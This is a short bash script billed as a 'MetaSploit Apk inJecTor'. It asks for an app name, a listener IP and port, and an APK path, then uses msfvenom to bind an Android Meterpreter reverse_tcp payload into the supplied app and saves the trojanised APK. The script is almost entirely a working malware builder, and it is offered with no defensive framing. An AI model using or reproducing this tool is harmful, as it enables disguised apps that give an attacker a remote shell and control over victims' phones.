echo -e "###########################"
echo -e "# \e[33mMetaSploit Apk inJecTor\e[0m #"
echo -e "###########################"
echo -e "Author :- SURAJCHAVDA"
echo -e "First Update kali with apt-get update otherwise maybe this tool not works...."
if zipalign -v &>/dev/null; then 
echo -e "Zipalign is Installed"
else apt-get install zipalign &>/dev/null
fi
echo''
read -p $'\e[31mEnter Your App Name after Inject  :-\e[0m' appname
read -p $'Enter Your Local Ip address       :-' loip
read -p $'\e[31mEnter Your Local Port             :-\e[0m' loport
read -p $'Enter the path of Apk file here   :-' path
echo "please wait...."
msfvenom -x $path -p android/meterpreter/reverse_tcp LHOST=$loip LPORT=$loport > /root/Desktop/$appname.apk
echo ''
echo -e "\e[93mFirst set All info in Metasploit\e[0m"
echo ""
echo -e "\e[5mYour Injected Apk file is saved in:-/root/Desktop/$appname.apk \e[0m"
echo ""
exit



